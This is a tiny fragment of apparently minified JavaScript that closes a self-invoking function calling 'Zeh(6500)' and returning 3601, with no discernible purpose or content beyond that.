);Zeh(6500);return 3601})()
